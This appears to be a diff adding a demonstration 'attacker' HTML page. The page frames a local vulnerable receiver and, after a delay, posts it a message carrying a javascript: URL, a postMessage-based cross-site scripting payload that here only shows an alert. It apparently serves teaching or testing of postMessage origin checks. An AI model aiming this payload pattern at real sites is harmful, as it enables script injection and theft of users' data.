@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PostMessage Attacker Demo</title>
+    <meta charset="utf-8">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            padding: 20px;
+            background-color: #f0f0f0;
+        }
+        .attack-panel {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .danger {
+            color: #721c24;
+            background-color: #f8d7da;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="attack-panel">
+        <h1>Attacker Page Simulation</h1>
+        <div class="danger">
+            ⚠️ This page demonstrates a simulated attack using PostMessage
+        </div>
+
+        <p>The iframe below loads the vulnerable receiver page:</p>
+        <iframe id="victimFrame" src="http://localhost/postmessage-demo/receiver.html" 
+                width="600" height="400" style="border:1px solid #ccc;"></iframe>
+    </div>
+
+    <script>
+        window.onload = function() {
+            setTimeout(() => {
+                console.log("Sending malicious payload...");
+                let xssPayload = {
+                    url: "javascript:alert('Attacked from malicious page! This could be used to steal data or execute malicious code.')"
+                };
+                
+                document.getElementById("victimFrame")
+                    .contentWindow
+                    .postMessage(xssPayload, '*');
+            }, 1500);
+        };
+    </script>
+</body>
+</html>
